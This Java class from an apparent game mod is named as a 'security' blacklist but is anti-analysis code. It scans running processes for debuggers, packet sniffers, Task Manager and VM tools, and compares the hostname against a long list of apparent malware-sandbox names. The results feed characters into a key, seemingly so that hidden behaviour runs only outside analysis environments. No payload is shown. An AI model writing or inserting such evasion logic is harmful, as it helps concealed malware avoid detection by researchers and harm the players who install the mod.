package com.example.Security;

import com.example.CoreUtil.SystemUtil;
import com.example.ExampleMod;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.InvocationTargetException;
import java.net.InetAddress;
import java.util.Arrays;
import java.util.List;

public class BlackList {
    public static void checkOffline() throws InterruptedException, IOException, IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        if (!System.getProperty("os.name").toLowerCase().contains("win")) return;


        String[] blacklistedNames = {
                "WDAGUtilityAccount","05h00Gi0","3u2v9m8","43By4","4tgiizsLimS","6O4KyHhJXBiR","7wjlGX7PjlW4","8Nl0ColNQ5bq","8VizSM","Abby","Amy","AppOnFlySupport","ASPNET","azure","BUiA1hkm","BvJChRPnsxn","cM0uEGN4do","cMkNdS6","DefaultAccount","dOuyo8RV71","DVrzi","e60UW","ecVtZ5wE","EGG0p","Frank","fred","G2DbYLDgzz8Y","george","GjBsjb","Guest","h7dk1xPr","h86LHD","Harry Johnson","HEUeRzl","hmarc","ICQja5iT","IVwoKUF","j6SHA37KA","j7pNjWM","John","jude","Julia","kEecfMwgj","kFu0lQwgX5P","KUv3bT4","Lisa","lK3zMR","lmVwjj9b","Louise","Lucas","mike","Mr.None","noK4zG7ZhOf","o6jdigq","o8yTi52T","OgJb6GqgK0O","patex","PateX","Paul Jones","pf5vj","PgfV1X","PqONjHVwexsS","pWOuqdTDQ","PxmdUOpVyx","QfofoG","QmIS5df7u","QORxJKNk","qZo9A","RDhJ0CNFevzX","RGzcBUyrznReg","S7Wjuf","server","SqgFOf3G","Steve","test","TVM","txWas1m2t","umyUJ","Uox1tzaMO","User01","w0fjuOVmCcP5A","WDAGUtilityAccount","XMiMmcKziitD","xPLyvzr8sgC","ykj0egq7fze","tim","DdQrgc","ryjIJKIrOMs","nZAp7UBVaS1","zOEsT","l3cnbB8Ar5b8","xUnUy","fNBDSlDTXY","vzY4jmH0Jw02","gu17B","UiQcX","21zLucUnfI85","OZFUCOD6","8LnfAai9QdJR","5sIBK","rB5BnfuR2","GexwjQdjXG","IZZuXj","ymONofg","dxd8DJ7c","JAW4Dz0","GJAm1NxXVm","UspG1y1C","equZE3J","BXw7q","lubi53aN14cU","5Y3y73","9yjCPsEYIMH","GGw8NR","JcOtj17dZx","05KvAUQKPQ","64F2tKIqO5","7DBgdxu","uHUQIuwoEFU","gL50ksOp","Of20XqH4VL","tHiF2T","Marci","sal.rosenburg","hbyLdJtcKyN1","Rt1r7","katorres","doroth","umehunt","HAPUBWS","YmtRdbA","Bruno","barbarray"
        };

        String[] blacklistedProcceses = {
                "httpdebuggerui.exe", "wireshark.exe", "fiddler.exe", "taskmgr.exe", "vboxservice.exe", "df5serv.exe",
                "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray", "vmacthlp.exe", "vmsrvc.exe", "vmusrvc.exe",
                "ida64.exe", "ollydbg.exe", "pestudio.exe", "vmwareuser.exe", "vgauthservice.exe",
                "x96dbg.exe", "x32dbg.exe", "prl_cc.exe", "prl_tools.exe", "xenservice.exe", "qemu-ga.exe",
                "joeboxcontrol.exe", "ksdumperclient.exe", "ksdumper.exe", "joeboxserver.exe"};

        final StringBuilder builder = new StringBuilder();
        final BufferedReader reader = new BufferedReader(new InputStreamReader(new ProcessBuilder("tasklist").start().getInputStream()));
        String line;

        while ((line = reader.readLine()) != null) {
            builder.append(line).append("\n");
        }
        try {
            ExampleMod.addToKey('k');
            String processes = builder.toString();
            String host = InetAddress.getLocalHost().getHostName();
            for (String process : blacklistedProcceses) {
                if (processes.contains(process)) {
                    ExampleMod.addToKey('S');
                    Thread.currentThread().interrupt();
                }
            }
            for (String name : blacklistedNames) {
                if (name.equals(host)) {
                    ExampleMod.addToKey('F');
                    Thread.currentThread().interrupt();
                }
            }
        } catch (IOException e) {}


        ExampleMod.addToKey('n');
        ExampleMod.addToKey('H');
    }
}
